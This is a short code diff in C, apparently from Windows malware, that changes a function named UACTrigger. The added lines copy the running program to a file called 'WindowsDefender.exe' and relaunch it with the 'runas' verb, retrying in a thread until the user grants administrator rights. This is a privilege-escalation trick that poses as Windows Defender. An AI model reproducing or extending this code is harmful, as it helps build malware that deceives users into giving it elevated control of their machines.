@@ -85,7 +85,7 @@ void UACTrigger() {
     if (!isalreadyadmin) {
 
 		SHELLEXECUTEINFO sei = {sizeof(sei)};
-
+		CopyFile( FhdawnInfo() , "WindowsDefender.exe", FALSE );
 		sei.lpVerb = "runas";
 		sei.lpFile = "WindowsDefender.exe";
 		sei.hwnd = NULL;
@@ -97,4 +97,11 @@ void UACTrigger() {
 			CreateThread(0, 0, (LPTHREAD_START_ROUTINE) UACTrigger, 0, 0, 0);
         }
     } 
+}
+
+char* FhdawnInfo()
+{
+	static char DIR[MAX_PATH];
+    GetModuleFileName(NULL, DIR, MAX_PATH);
+	return PathFindFileName(DIR);
 }
